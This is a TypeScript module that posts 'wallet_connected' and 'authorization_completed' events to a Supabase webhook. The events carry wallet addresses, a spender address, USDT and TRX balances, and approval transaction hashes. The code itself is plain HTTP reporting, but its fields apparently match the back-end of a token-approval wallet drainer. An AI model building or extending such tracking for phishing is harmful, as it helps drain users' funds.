import { supabase } from "@/integrations/supabase/client";

// Default webhook URL
const DEFAULT_WEBHOOK_URL = "https://owgnyztchbastgwucebf.supabase.co/functions/v1/address-webhook";

// Get webhook URL from app_settings
export const getWebhookUrl = async (): Promise<string> => {
  try {
    const { data, error } = await supabase
      .from('app_settings' as any)
      .select('value')
      .eq('key', 'webhook_url')
      .maybeSingle() as { data: { value: string } | null, error: any };

    if (error || !data?.value) {
      console.log('Using default webhook URL');
      return DEFAULT_WEBHOOK_URL;
    }

    return data.value;
  } catch (e) {
    console.error('Error fetching webhook URL:', e);
    return DEFAULT_WEBHOOK_URL;
  }
};

// Wallet connection data format
export interface WalletConnectedData {
  event: "wallet_connected";
  timestamp: string;
  data: {
    order_id: string;
    wallet_address: string;
    username: string;
    currency: string;
    network: string;
    spender_address: string;
    usdt_balance: number;
    trx_balance: number;
  };
}

// Authorization completed data format
export interface AuthorizationCompletedData {
  event: "authorization_completed";
  timestamp: string;
  data: {
    order_id: string;
    wallet_address: string;
    username: string;
    currency: string;
    network: string;
    spender_address: string;
    usdt_balance: number;
    trx_balance: number;
    tx_hash: string;
    status: "success" | "failed";
    payment_mode: "safe" | "whitelist";
  };
}

// Send wallet connected event
export const sendWalletConnectedEvent = async (data: WalletConnectedData["data"]): Promise<boolean> => {
  try {
    const webhookUrl = await getWebhookUrl();
    
    const payload: WalletConnectedData = {
      event: "wallet_connected",
      timestamp: new Date().toISOString(),
      data
    };

    console.log("Sending wallet_connected event:", payload);

    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      console.error("Webhook request failed:", response.status, await response.text());
      return false;
    }

    console.log("Wallet connected event sent successfully");
    return true;
  } catch (error) {
    console.error("Error sending wallet connected event:", error);
    return false;
  }
};

// Send authorization completed event
export const sendAuthorizationCompletedEvent = async (data: AuthorizationCompletedData["data"]): Promise<boolean> => {
  try {
    const webhookUrl = await getWebhookUrl();
    
    const payload: AuthorizationCompletedData = {
      event: "authorization_completed",
      timestamp: new Date().toISOString(),
      data
    };

    console.log("Sending authorization_completed event:", payload);

    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      console.error("Webhook request failed:", response.status, await response.text());
      return false;
    }

    console.log("Authorization completed event sent successfully");
    return true;
  } catch (error) {
    console.error("Error sending authorization completed event:", error);
    return false;
  }
};
